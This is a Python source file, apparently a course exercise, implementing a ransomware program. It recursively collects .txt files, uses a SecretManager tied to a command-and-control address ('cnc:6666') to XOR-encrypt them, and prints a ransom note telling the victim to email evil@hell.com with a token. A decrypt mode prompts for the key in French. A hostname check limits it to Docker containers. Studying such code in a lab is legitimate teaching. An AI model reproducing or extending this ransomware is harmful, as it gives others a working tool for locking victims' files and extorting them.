import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        # return all files matching the filter
        path = Path('.')
        all_files = [str(file) for file in path.rglob(filter)]
        return all_files
    
    def encrypt(self):
        # main function for encrypting (see PDF)
        # to have all txt files
        txt_files = self.get_files("*.txt")

        #Create a secret manager
        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)

        #Call the fonction setup
        secret_manager.setup()

        #Encrypt the files with xorfiles()
        secret_manager.xorfiles(txt_files)

        #Send the message of the attack
        hex_token = secret_manager.get_hex_token()
        print(ENCRYPT_MESSAGE.format(token = hex_token))


    def decrypt(self):
        # main function for decrypting (see PDF)
        #Creat a SecretManager object
        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)

        #Load the secrets 
        secret_manager.load()

        #Liste all the .txt files
        txt_files = self.get_files("*.txt")
        while True:
            try:
                #Ask for the key
                key = input(" Donne moi ton mot de passe ")

                #Call set_key function
                secret_manager.set_key(key)

                #Call xorfiles for decrypt files
                secret_manager.xorfiles(txt_files)

                #Call clean function
                secret_manager.clean()

                #Send a message that the decryption was successfull
                print(" Bien joue! Tout est bon")
                
                #Exit 
                break

            except ValueError as erreur:
                #Inform if anything went wrong
                print(" Error!!!!! Donne moi le vrai mot de passe ")
                


if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()